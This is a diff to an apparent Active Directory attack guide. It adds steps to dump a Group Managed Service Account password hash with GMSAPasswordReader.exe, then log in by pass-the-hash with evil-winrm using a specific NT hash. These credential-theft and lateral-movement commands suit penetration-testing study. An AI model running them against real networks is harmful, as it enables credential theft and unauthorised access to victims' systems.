@@ -22,6 +22,17 @@ There are several ways to abuse the ability to read the Group Managed Service Ac
 
 ### Methods to Retrieve gMSA Passwords
 
+#### Using [GMSAPasswordReader.exe](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/raw/refs/heads/main/Tools/GMSAPasswordReader.exe)
+``` shell
+.\GMSAPasswordReader.exe --accountname 'Target_Account'
+```
+![image](https://github.com/user-attachments/assets/5bd3e7f0-c1d6-4eef-b6b0-9491a5d09c59)
+`The rc4_hmac hash is the same as the NT hash, they are interchangeable.`
+With the user’s NTLM hash, we can perform a pass-the-hash attack using evil-winrm to get a foothold on the victim. 
+```shell
+evil-winrm -i <Target-IP> -u svc_apache$ -H 41bcd07b8cc9636826fe07ff9539ca57
+```
+
 #### **Using Active Directory and DSInternals PowerShell Modules**
 
 1. Save the gMSA password blob to a variable:
